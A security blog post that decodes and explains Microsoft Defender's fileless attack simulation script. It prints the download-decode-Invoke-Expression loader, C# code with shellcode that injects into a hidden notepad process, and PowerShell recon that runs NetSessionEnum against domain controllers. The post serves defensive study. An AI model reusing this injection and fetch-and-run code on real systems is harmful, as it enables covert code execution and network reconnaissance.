---
layout: post
title: "an eye on Microsoft 365 Attack Simulation Script"
excerpt: "Fileless PS attack with Process Injection and SMB recon"
excerpt_separator: "<!--more-->"
categories:
  - security
tags:
  - MicrosoftDefender
  - Security
last_modified_at: 2023-07-28T11:12:23-02:00
---



# Analyze the script


>You can download the script for the MS defender portal of your tenant

Here is the complete script:

```shell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor	= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String =	(Invoke-WebRequest -URI	https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt	-UseBasicParsing).Content;Try{ $contentBytes =	[System.Convert]::FromBase64String($base64String) } Catch { $contentBytes =	[System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;	$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];	$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression	([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

The script converts the string 'WinATP-Intro-Injection' into a byte array using UTF-8 encoding.
It then makes a web request to the specified URL, fetches the content of the response, and stores it in the $base64String variable.


Let's write some PS lines to decypher it:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt -UseBasicParsing).Content;

Try {
    $contentBytes = [System.Convert]::FromBase64String($base64String)
} Catch {
    $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3))
};

$i = 0;
$decryptedBytes = @();
write-host -ForegroundColor Green deciphering...
$contentBytes.foreach{
    $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {$i = 0}
};

# Displaying the decrypted content without executing it
$decryptedContent = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
write-host -ForegroundColor Cyan $decryptedContent
```

And execute it:, we get this code:

```shell
$source = @"

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

#region Utils
public static class ProcessExtensions
{
    public static IntPtr ProcessHandler { get; set; }
    static ProcessExtensions()
    {

    }

    public static IntPtr Alloc(this Process proc, int size)
    {
        if (ProcessHandler == null)
        {
            return VirtualAllocEx(proc.Handle, IntPtr.Zero, (IntPtr)size,
            AllocationType.Commit | AllocationType.Reserve,
            MemoryProtection.ExecuteReadWrite);
        }
        else
        {
            return VirtualAllocEx(ProcessHandler, IntPtr.Zero, (IntPtr)size,
            AllocationType.Commit | AllocationType.Reserve,
            MemoryProtection.ExecuteReadWrite);
        }
    }

    public static bool Write(this Process proc, IntPtr ptr, byte[] data)
    {
        IntPtr nBytes;

        if (ProcessHandler == null)
        {
            return WriteProcessMemory(proc.Handle, ptr, data,
                data.Length, out nBytes);

        }
        else
        {
            bool ret = WriteProcessMemory(ProcessHandler, ptr, data,
            data.Length, out nBytes);
            return ret;

        }
    }

    private static ProcessThread GetMainThread(this Process process)
    {
        ProcessThread result = null;
        foreach (ProcessThread thread in process.Threads)
        {
            if ((result == null) || (thread.StartTime < result.StartTime))
            {
                result = thread;
            }
        }
        return result;
    }
    
    public static int Call(this Process proc, IntPtr ptr, IntPtr arg)
    {
        IntPtr hThreadId;
        var hThread = IntPtr.Zero;
        if (ProcessHandler == null)
        {
            hThread = CreateRemoteThread(proc.Handle, IntPtr.Zero, 0,
                ptr, arg, 0, out hThreadId);
        }
        else
        {
            hThread = CreateRemoteThread(ProcessHandler, IntPtr.Zero, 0,
            ptr, arg, 0, out hThreadId);
        }
        return 0;
    }

    public static IntPtr OpenProc(this Process proc, ProcessAccessFlags flags)
    {
        return (IntPtr)OpenProcess(flags, false, proc.Id);
    }
    
    public static void TypeText(this Process proc, string text)
    {
        IntPtr hWnd = FindWindow("Notepad", proc.MainWindowTitle);
        if (!hWnd.Equals(IntPtr.Zero))
        {
            // retrieve Edit window handle of Notepad
            IntPtr edithWnd = FindWindowEx(hWnd, IntPtr.Zero, "Edit", null);
            if (!edithWnd.Equals(IntPtr.Zero))
                // send WM_SETTEXT message with "Hello World!"
                SendMessage(edithWnd, WM_SETTEXT, IntPtr.Zero, text);
        }
    }

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }
    
    [Flags]
    public enum ThreadAccess : uint
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200)
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess,
    IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
    IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out IntPtr lpNumberOfBytesWritten);

const int WM_SETTEXT = 0x000C;
[DllImport("user32.dll")]
    static extern IntPtr FindWindow(
    string lpClassName,
    string lpWindowName);

[DllImport("User32.dll")]
static extern IntPtr FindWindowEx(
    IntPtr hwndParent,
    IntPtr hwndChildAfter,
    string lpszClass,
    string lpszWindows);

[DllImport("User32.dll")]
static extern Int32 SendMessage(
    IntPtr hWnd,
    int Msg,
    IntPtr wParam,
    string lParam);
}

#endregion

public class CodeInjection
{
    const string c_targetProcess = @"%windir%\System32\notepad.exe";

    private static readonly byte[] s_shellcode = new byte[] { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x4
8, 0x8B, 0x40, 0x20, 0x48, 0x89, 0x45, 0x08, 0x48, 0x8B, 0x45, 0x08, 0x48, 0x8B, 0x48, 0x50, 0xE8, 0x9E, 0x02, 0x00, 0x00, 0x3D, 0x3F, 0xD6, 0xEC, 0x8F, 0x48, 0x8B, 0x45, 0x08, 0x74, 0x09, 0x48, 0x8B, 0x00, 0x
48, 0x89, 0x45, 0x08, 0xEB, 0xDF, 0x48, 0x8B, 0x40, 0x20, 0x49, 0x89, 0xC6, 0x48, 0x89, 0xC1, 0xBA, 0x8E, 0x4E, 0x0E, 0xEC, 0xE8, 0xBD, 0x02, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x6B, 0x02, 0x00, 0x00, 0
xE8, 0x0C, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6E, 0x48, 0x74, 0x74, 0x70, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x59, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x4E, 0x02, 0x00, 0x00, 0x49, 0x89, 0xC5, 0xBA, 0xBE, 0x6D, 
0x02, 0xD1, 0x4C, 0x89, 0xE9, 0xE8, 0x87, 0x02, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x35, 0x02, 0x00, 0x00, 0xE8, 0x32, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x79, 0x00, 0x48, 0x00, 0x6F, 0x00, 0x76, 0x00, 0x65,
 0x00, 0x72, 0x00, 0x63, 0x00, 0x72, 0x00, 0x61, 0x00, 0x66, 0x00, 0x74, 0x00, 0x49, 0x00, 0x73, 0x00, 0x46, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x4F, 0x00, 0x66, 0x00, 0x45, 0x00, 0x65, 0x00, 0x6C, 0x00
, 0x73, 0x00, 0x00, 0x00, 0x59, 0x48, 0x83, 0xEC, 0x30, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x4C, 0x24, 0x20, 0xE8, 0x00, 0x01, 0x00, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x7
A, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x2F, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x20, 0x00, 0x28, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x
00, 0x20, 0x00, 0x4E, 0x00, 0x54, 0x00, 0x20, 0x00, 0x31, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x3B, 0x00, 0x20, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x36, 0x00, 0x34, 0x00, 0x3B, 0x00, 0x20, 0x00, 0
x78, 0x00, 0x36, 0x00, 0x34, 0x00, 0x29, 0x00, 0x20, 0x00, 0x41, 0x00, 0x70, 0x00, 0x70, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x57, 0x00, 0x65, 0x00, 0x62, 0x00, 0x4B, 0x00, 0x69, 0x00, 0x74, 0x00, 0x2F, 0x00, 0x35, 
0x00, 0x33, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x33, 0x00, 0x36, 0x00, 0x20, 0x00, 0x28, 0x00, 0x4B, 0x00, 0x48, 0x00, 0x54, 0x00, 0x4D, 0x00, 0x4C, 0x00, 0x2C, 0x00, 0x20, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x6B, 0x00,
 0x65, 0x00, 0x20, 0x00, 0x47, 0x00, 0x65, 0x00, 0x63, 0x00, 0x6B, 0x00, 0x6F, 0x00, 0x29, 0x00, 0x20, 0x00, 0x43, 0x00, 0x68, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x2F, 0x00, 0x34, 0x00, 0x32
, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x32, 0x00, 0x33, 0x00, 0x31, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x33, 0x00, 0x35, 0x00, 0x20, 0x00, 0x53, 0x00, 0x61, 0x00, 0x66, 0x00, 0x61, 0x00, 0x72, 0x0
0, 0x69, 0x00, 0x2F, 0x00, 0x35, 0x00, 0x33, 0x00, 0x37, 0x00, 0x2E, 0x00, 0x33, 0x00, 0x36, 0x00, 0x20, 0x00, 0x45, 0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00, 0x2F, 0x00, 0x31, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x
32, 0x00, 0x34, 0x00, 0x36, 0x00, 0x00, 0x00, 0x59, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xD8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC4, 0xBA, 0x8F, 0xAE, 0x8A, 0x00, 0x4C, 0x89, 0xE9, 0xE8, 0x11, 0x01, 0x00, 0
x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xBF, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0x1E, 0x00, 0x00, 0x00, 0x32, 0x00, 0x30, 0x00, 0x34, 0x00, 0x2E, 0x00, 0x37, 0x00, 0x39, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x39, 
0x00, 0x37, 0x00, 0x2E, 0x00, 0x32, 0x00, 0x30, 0x00, 0x33, 0x00, 0x00, 0x00, 0x5A, 0x41, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x84, 0x00, 0x00, 0x00, 0x49,
 0x89, 0xC4, 0xBA, 0xC1, 0xE1, 0x34, 0x8F, 0x4C, 0x89, 0xE9, 0xE8, 0xBD, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x6F, 0x4D, 0x31, 0xC9, 0x48, 0x83, 0xEC, 0x40, 0x4C, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x89, 0x4C
, 0x24, 0x28, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x47, 0x00, 0x45, 0x00, 0x54, 0x00, 0x00, 0x00, 0x5A, 0x4C, 0x89, 0xE1, 0xFF, 0xD0, 0x48, 0x85, 0xC
0, 0x74, 0x3B, 0x49, 0x89, 0xC4, 0xBA, 0x82, 0x88, 0x34, 0x98, 0x4C, 0x89, 0xE9, 0xE8, 0x74, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x26, 0x48, 0x83, 0xEC, 0x40, 0x4D, 0x31, 0xC9, 0x4C, 0x89, 0x4C, 0x24, 0x
30, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0x4C, 0x24, 0x28, 0x48, 0x31, 0xD2, 0x4C, 0x89, 0xE1, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0xFF, 0xD0, 0x48, 0x85, 0xC0, 0x74, 0x00, 0xEB, 0xFE, 0x31, 0xC0, 0x31, 0xD2, 0x48, 0x85, 0
xC9, 0x74, 0x23, 0x66, 0x8B, 0x11, 0x66, 0x85, 0xD2, 0x74, 0x1B, 0x48, 0x83, 0xC1, 0x02, 0xC1, 0xC8, 0x0D, 0x66, 0x83, 0xFA, 0x41, 0x72, 0x0A, 0x66, 0x83, 0xFA, 0x5A, 0x77, 0x04, 0x66, 0x83, 0xC2, 0x20, 0x01, 
0xD0, 0xEB, 0xDD, 0xC3, 0x31, 0xC0, 0x31, 0xD2, 0x48, 0x85, 0xC9, 0x74, 0x10, 0x8A, 0x11, 0x84, 0xD2, 0x74, 0x0A, 0x48, 0xFF, 0xC1, 0xC1, 0xC8, 0x0D, 0x01, 0xD0, 0xEB, 0xF0, 0xC3, 0x48, 0x31, 0xC0, 0x48, 0x85,
 0xC9, 0x74, 0x72, 0x49, 0x89, 0xC9, 0x4D, 0x31, 0xC0, 0x45, 0x8B, 0x41, 0x3C, 0x47, 0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x01, 0xC8, 0x48, 0x31, 0xC9, 0x41, 0x8B, 0x48, 0x18, 0x4D, 0x31, 0xD2, 0x45
, 0x8B, 0x50, 0x20, 0x4D, 0x01, 0xCA, 0x48, 0x31, 0xC0, 0x67, 0xE3, 0x46, 0xFF, 0xC9, 0x4D, 0x31, 0xDB, 0x45, 0x8B, 0x1C, 0x8A, 0x4D, 0x01, 0xCB, 0x51, 0x52, 0x4C, 0x89, 0xD9, 0xE8, 0x9C, 0xFF, 0xFF, 0xFF, 0x5
A, 0x59, 0x39, 0xD0, 0x75, 0xDE, 0x4D, 0x31, 0xD2, 0x45, 0x8B, 0x50, 0x24, 0x4D, 0x01, 0xCA, 0x66, 0x41, 0x8B, 0x0C, 0x4A, 0x48, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x4D, 0x31, 0xD2, 0x45, 0x8B, 0x50, 0x1C, 0x
4D, 0x01, 0xCA, 0x48, 0x31, 0xC0, 0x41, 0x8B, 0x04, 0x8A, 0x4C, 0x01, 0xC8, 0xC3 };


    public static void Main(string[] args)
    {
        Inject();
    }

    public static void Inject()
    {
        string targetProcessCommand = Environment.ExpandEnvironmentVariables(c_targetProcess);
        ProcessStartInfo startInfo = new ProcessStartInfo(targetProcessCommand);
        startInfo.UseShellExecute = false;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process targetProc = Process.Start(startInfo);
        System.Threading.Thread.Sleep(50);

        var createdProcessPtr = targetProc.OpenProc(ProcessExtensions.ProcessAccessFlags.All);
        if (createdProcessPtr == IntPtr.Zero)
        {
            System.Threading.Thread.Sleep(50);
            createdProcessPtr = targetProc.OpenProc(ProcessExtensions.ProcessAccessFlags.All);
        }
        ProcessExtensions.ProcessHandler = createdProcessPtr;

        System.Threading.Thread.Sleep(500);
        IntPtr remoteShellcodeAddr = targetProc.Alloc(s_shellcode.Length);
        if (remoteShellcodeAddr == IntPtr.Zero)
        {
            System.Threading.Thread.Sleep(50);
            remoteShellcodeAddr = targetProc.Alloc(s_shellcode.Length);
        }

        bool res = targetProc.Write(remoteShellcodeAddr, s_shellcode);
        if (!res)
        {
            System.Threading.Thread.Sleep(50);
            targetProc.Write(remoteShellcodeAddr, s_shellcode);
        }
        
        targetProc.Call(remoteShellcodeAddr, IntPtr.Zero);
        string msg = "Hi!" + Environment.NewLine +
            "A shellcode was just injected to this process" + Environment.NewLine +
            "If your OS build is 1809 or higher, then keep this window open to see WDATP's Auto IR in action!" + Environment.NewLine +
            "Otherwise, feel free to close this window" + Environment.NewLine + Environment.NewLine +
            "More info in our walkthrough under: https://securitycenter.windows.com/tutorials";
        msg = msg.Replace("@", "$");
        targetProc.TypeText(msg);
    }
}
"@;Add-Type -TypeDefinition $source;[CodeInjection]::Inject()

```

1.  The ShellCode Injection

This section contains a C# class named ProcessExtensions, which is meant to extend the Process class with various methods related to memory allocation, writing data to memory, and thread creation in a remote process.
The class uses various Windows API functions such as VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, FindWindow, and SendMessage to manipulate the memory and behavior of a remote process.
The methods in the class are used to allocate memory in a target process, write shellcode to that memory, and create a remote thread that starts executing the injected shellcode.


The shellcode is represented as a large byte array (s_shellcode) in hexadecimal notation. This array is encoded with machine instructions and data that will be injected and executed in the target process with is the notepad in this case.

2. the Main Function (PowerShell):

The Main function is responsible for invoking the shellcode injection. 
It calls the Inject method from the CodeInjection class, which performs the actual injection process.
It creates a hidden instance of the target process (notepad.exe), allocates memory for the shellcode in the target process, writes the shellcode to the allocated memory, creates a remote thread to execute the shellcode, and sends a text message to the target process.



```powershell

$logfile = $env:temp + '\reconlog.txt'
function Write-DebugLog 
{
   param( [string]$message, [string]$filepath =  $logfile )   
   $message | Out-File $filepath -append
   Write-Host $message   
}

{
   param( [string]$cmdline)
   Write-DebugLog "Will run $cmdline"
   $result = Invoke-Expression $cmdline  2>&1 | %{ "$_" } | Out-String
   Write-DebugLog $result   
}


function DoRecon() {    
    Add-Type -TypeDefinition @"

    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    public class MyNetSes
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SESSION_INFO_10
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string OriginatingHost;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string DomainUser;
            public uint SessionTime;
            public uint IdleTime;
        }

        private static class Netapi32
        {
            [DllImport("Netapi32.dll", SetLastError = true)]
            public static extern int NetSessionEnum(
                    [In, MarshalAs(UnmanagedType.LPWStr)] string servername,
                    [In, MarshalAs(UnmanagedType.LPWStr)] string clientname,
                    [In, MarshalAs(UnmanagedType.LPWStr)] string username,
                    Int32 level,
                    out SESSION_INFO_10 bufptr,
                    int prefmaxlen,
                    ref Int32 entriesread,
                    ref Int32 totalentries,
                    ref Int32 resume_handle);     
        }

        public static int  smbRecon(string host)
        {
            SESSION_INFO_10 sInfo = new SESSION_INFO_10();
            Int32 entriesread = 0;
            Int32 totalentries = 0;
            Int32 resume_handle = 0;
            var returnCode = Netapi32.NetSessionEnum(host, null,null, 10,out sInfo, -1, ref entriesread, ref totalentries, ref resume_handle);
        
            return returnCode;
        }   
    }
"@


```

3. The Network Reconnaissance (PowerShell):

```powershell
    try {
        $domains = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain() 
    }
    catch {
        Write-DebugLog "Failed to resolve Domain Controllers in the domain"
        return;
    }

    $domains.DomainControllers | ForEach-Object {         
        if (Test-Connection  $_ -Quiet) {
            Write-DebugLog "can reach $_"
            $result = [MyNetSes]::smbRecon($_)            
            Write-DebugLog "ran NetSessionEnum against $_ with return code $result"
        }        
    }    
}

DoRecon
```

The script then switches to PowerShell and defines a function named DoRecon.
This function imports a C# class named MyNetSes that is embedded within the script. 
This class uses Windows API calls to perform network reconnaissance against domain controllers.
The script attempts to obtain a list of domain controllers for the current domain and then iterates through each domain controller.
For each domain controller that responds to a ping (Test-Connection), the script attempts to run the NetSessionEnum function from the imported MyNetSes class against the domain controller to retrieve session information.
The results of the reconnaissance are logged using Write-DebugLog.





For More documentaion
https://mtpstaticcontent.blob.core.windows.net/mtpstaticfiles/MTP_PowerShellFilelessInjectionSMBRecon.pdf